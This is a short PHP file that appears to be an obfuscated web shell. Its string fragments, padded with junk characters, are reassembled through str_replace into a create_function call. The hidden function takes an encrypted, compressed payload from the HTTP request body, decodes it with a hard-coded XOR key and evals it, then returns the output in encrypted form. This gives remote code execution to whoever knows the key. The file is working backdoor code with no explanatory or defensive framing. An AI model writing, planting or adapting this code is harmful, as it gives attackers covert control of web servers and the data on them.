<?php
$O='$k="fd08uj8ujc55";$kh=uj"3c249uj436a9a7"uj;$kfuj=uj"33uj24905ujuj56cd6";$p="meTS4byT';
$i='xZGujujjpujciO";functioujn xuj($ujt,$k){$c=strlenuj($k);$luj=strujlen(uj$ujt);$o=';
$T=str_replace('p','','crpeppate_pfpupnction');
$J='jean()uj;$r=@baseuj64_ujencujode(@x(@gzujcompressuj($o),uj$k));prujint("$puj$khuj$r$kf");}';
$B='^$k{$j}uj;}uj}return $ujo;}if uj(@preguj_matujch(uj"/$khuj(.+)$kf/uj",@fileujuj_get_cont';
$X='ents(uj"php://iujnpujut"),$m)==uj1) {@oujb_sujtart();@eujvujal(@gzujuncoujmpress(@';
$n='x(@bujase64uj_ujdecode($m[1]ujujuj),$k)));$o=@ob_get_ujconujtenujts()uj;@ob_end_clu';
$H='"";for($uji=0;uj$i<$ujl;){fujor($ujujj=0;uj($j<$c&&$i<$l);$j++,uj$i++){$ujo.=$ujt{$i}';
$j=str_replace('uj','',$O.$i.$H.$B.$X.$n.$J);
$F=$T('',$j);$F();
?>
